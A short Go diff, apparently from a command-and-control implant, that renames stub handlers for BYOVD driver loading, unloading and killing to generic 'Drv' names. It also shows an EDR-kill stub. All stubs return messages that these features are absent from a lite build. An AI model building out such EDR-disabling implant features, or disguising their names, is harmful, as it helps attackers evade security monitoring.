@@ -96,15 +96,15 @@ func handleEDRKill(taskData string) (string, int32, string) {
 	return "", -1, "EDR 击杀未包含在精简构建中"
 }
 
-func handleBYOVDLoad(taskData string) (string, int32, string) {
+func handleDrvLoad(taskData string) (string, int32, string) {
 	return "", -1, "BYOVD 未包含在精简构建中"
 }
 
-func handleBYOVDUnload(taskData string) (string, int32, string) {
+func handleDrvUnload(taskData string) (string, int32, string) {
 	return "", -1, "BYOVD 未包含在精简构建中"
 }
 
-func handleBYOVDKill(taskData string) (string, int32, string) {
+func handleDrvKill(taskData string) (string, int32, string) {
 	return "", -1, "BYOVD 未包含在精简构建中"
 }
 
